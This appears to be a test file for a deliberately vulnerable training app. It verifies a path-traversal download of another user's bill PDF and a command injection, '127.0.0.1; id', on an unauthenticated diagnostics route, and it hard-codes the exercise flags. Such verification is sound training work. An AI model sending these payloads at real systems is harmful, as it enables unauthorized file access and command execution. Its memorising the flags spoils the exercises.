import io

from pypdf import PdfReader

TRAVERSAL_TEACH = "FLAG{WRONG_DOOR}"          # flag lives inside ben's bill PDF, not the response body
CMDINJECT_EXERCISE = "FLAG{FRACTURED_GLASS}"  # /admin/diagnostics, unauthenticated, shell metacharacters


def test_traversal_teach(devon, base_url):
    # devon owns MTR-1004; walking up and into MTR-1002 (ben's) folder is
    # the traversal. Real path traversal, not just an ID swap.
    resp = devon.get(
        f"{base_url}/bills/download",
        params={"path": "MTR-1004/../MTR-1002/2026-09.pdf"},
        timeout=10,
    )
    assert resp.status_code == 200
    assert resp.headers.get("Content-Type", "").startswith("application/pdf")

    reader = PdfReader(io.BytesIO(resp.content))
    text = "\n".join(page.extract_text() or "" for page in reader.pages)
    assert TRAVERSAL_TEACH in text


def test_cmdinject_exercise(anon_session, base_url):
    # No login required at all -- this route has no @login_required.
    # `id` is a harmless, read-only command; this is intentionally the
    # same benign PoC the instructor guide itself uses. Safe here because
    # CI containers are single-use and discarded immediately after the job.
    resp = anon_session.post(f"{base_url}/admin/diagnostics", data={"host": "127.0.0.1; id"}, timeout=15)
    assert resp.status_code == 200
    assert CMDINJECT_EXERCISE in resp.text
